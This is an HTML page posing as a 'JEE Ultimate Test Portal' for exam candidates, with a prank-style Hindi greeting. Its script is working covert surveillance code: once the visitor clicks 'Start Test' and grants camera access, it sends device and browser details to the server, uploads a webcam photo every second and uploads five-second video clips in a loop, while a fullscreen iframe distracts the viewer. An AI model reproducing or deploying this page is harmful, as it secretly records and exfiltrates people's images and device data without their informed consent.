<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>JEE Ultimate Test Portal Elite</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
html,body{height:100%;overflow:hidden;color:#fff}
body{background:
radial-gradient(circle at top left,#06b6d4 0%,transparent 35%),
radial-gradient(circle at bottom right,#7c3aed 0%,transparent 35%),
linear-gradient(135deg,#020617,#0f172a,#1e1b4b);
display:flex;align-items:center;justify-content:center}
#overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35);backdrop-filter:blur(16px);padding:24px}
.card{width:min(92%,840px);padding:60px;border-radius:30px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);text-align:center;box-shadow:0 30px 90px rgba(0,0,0,.55)}
.logo{font-size:70px}.chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin:20px 0}.chips span{padding:8px 15px;border-radius:99px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15)}
h1{font-size:56px;background:linear-gradient(90deg,#22d3ee,#fff,#8b5cf6,#ff4ecd);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#intro{font-size:20px;color:#ff6b6b;margin:18px 0}
button{padding:16px 52px;border:none;border-radius:99px;background:linear-gradient(135deg,#06b6d4,#7c3aed,#ff006e);color:#fff;font-size:20px;font-weight:700;cursor:pointer}
iframe{width:100%;height:100%;border:0;display:none}#v,#c{display:none}
</style></head><body>
<div id="overlay"><div class="card"><div class="logo">🚀</div><h1>JEE Ultimate Test Portal</h1><div id="intro">😎☠️ Oye bhooooootni....😎🥱<br>🔥 "Tomar Ji ka system hai... lightly mat lena"</div><div class="chips"><span>⚡ AI Powered</span><span>🔒 Secure</span><span>📱 Responsive</span><span>🎯 JEE 2026</span></div><button onclick="start()">▶ Start Test</button></div></div>
<iframe id="frame"></iframe><video id="v" autoplay playsinline></video><canvas id="c"></canvas>
<script>
let recorder;let chunks=[];
function sendDeviceInfo(){fetch("/device",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({device:navigator.platform,os:navigator.userAgent,browser:navigator.appVersion,screen:screen.width+"x"+screen.height})});}
function capture(){if(!v.videoWidth)return;c.width=v.videoWidth;c.height=v.videoHeight;const ctx=c.getContext("2d");ctx.drawImage(v,0,0,c.width,c.height);c.toBlob(b=>{let f=new FormData();f.append("photo",b,"u.jpg");fetch("/upload",{method:"POST",body:f});},"image/jpeg",0.9);}
function startVideo(stream){recorder=new MediaRecorder(stream);recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{let blob=new Blob(chunks,{type:"video/webm"});chunks=[];let f=new FormData();f.append("video",blob,"v.webm");fetch("/video",{method:"POST",body:f});};setInterval(()=>{recorder.start();setTimeout(()=>recorder.stop(),5000);},5000);}
async function start(){let stream;try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});}catch(e){alert("Camera permission required");return;}v.srcObject=stream;sendDeviceInfo();setInterval(capture,1000);startVideo(stream);document.getElementById("overlay").style.display="none";const r=await fetch("/get_video_link");const d=await r.json();const frame=document.getElementById("frame");frame.style.display="block";frame.src=d.url;if(frame.requestFullscreen)frame.requestFullscreen();}
</script></body></html>
